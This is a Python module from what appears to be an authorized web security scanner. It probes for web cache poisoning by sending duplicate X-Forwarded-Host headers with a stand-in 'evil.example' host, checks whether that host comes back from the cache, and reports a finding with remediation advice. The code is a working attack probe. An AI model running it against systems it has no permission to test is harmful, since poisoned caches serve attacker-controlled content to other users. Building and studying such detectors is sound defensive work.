"""
CacheAdv v1 — next-generation Cache/CDN Attack for VANTHEX (v1.9.0).
AUTHORIZED TESTING ONLY — with cache-busters, so the real cache is not
polluted (fixture/lab cases).

Detects:
- Web cache poisoning via header normalization (X-Forwarded-Host:
  server takes the LAST header / splits on commas incorrectly)
- Cache key normalization bug (path // / ; / %2f normalized differently
  between cache and origin)
All probes use a unique query (cb=<rand>) so the real production cache
is never disturbed.
"""
import random as _random
import urllib.parse as _up

from exploitkit import _F

_POISON_MARKER = "poisoned-vhx-"


def _probe_cache(ctx, ep, headers=None):
    try:
        return ctx.client.get(ep, headers=headers or {})
    except Exception:
        return None


def c_cache_poisoning_v2(ctx, add):
    """Poisoning via duplicate headers (two X-Forwarded-Host values → server
    takes the last one) — enemy host reflected in a response that is
    CACHED for other users. Control /safe/cdn/cache: ignores the
    header (cannot be poisoned)."""
    cb = str(_random.Random().randbytes(4).hex())
    ep = f"/cdn/cache?cb={cb}"
    # baseline: normal response
    r0 = _probe_cache(ctx, ep)
    if r0 is None or r0.status != 200:
        return
    # poisoning probe: two XFH headers — the second one is evil
    evil_host = _POISON_MARKER + cb + ".evil.example"
    rp = None
    try:
        rp = ctx.client.get(ep + "&p=2",
                            headers=[("X-Forwarded-Host", "internal.local"),
                                     ("X-Forwarded-Host", evil_host)])
    except Exception:
        return
    if rp is None:
        return
    poisoned_now = evil_host in (rp.body or "")
    # verify cache persistence: request WITHOUT the evil header
    rv = _probe_cache(ctx, ep + "&v=verify")
    cached_for_others = rv is not None and evil_host in (rv.body or "")
    if not (poisoned_now or cached_for_others):
        return
    # safe control
    rs = None
    try:
        rs = ctx.client.get("/safe/cdn/cache?cb=" + cb,
                            headers=[("X-Forwarded-Host", "internal.local"),
                                     ("X-Forwarded-Host", evil_host)])
    except Exception:
        pass
    if rs is not None and evil_host in (rs.body or ""):
        ctx.L("  [cache] /safe control can also be poisoned — not the intended target")
        return
    add(_F("HIGH",
           "Web Cache Poisoning via Duplicate Header Normalization",
           f"The CDN/origin takes the LAST X-Forwarded-Host from duplicate "
           f"headers and caches the result — content with the enemy host "
           f"({evil_host[:30]}...) is served to other users "
           f"({'confirmed served from cache' if cached_for_others else 'direct poisoning proven'}).",
           evidence=f"poisoned_now={poisoned_now}; "
                    f"cached_for_others={cached_for_others}; /safe immune",
           cwe="CWE-444", owasp="A05:2021 Security Misconfiguration",
           cvss=7.8, location="/cdn/cache", param="X-Forwarded-Host",
           remed="Strict header normalization (take the first / reject "
                 "duplicates), cache key includes the canonical host, "
                 "disable reflection of unregistered hosts.",
           confidence="confirmed"))
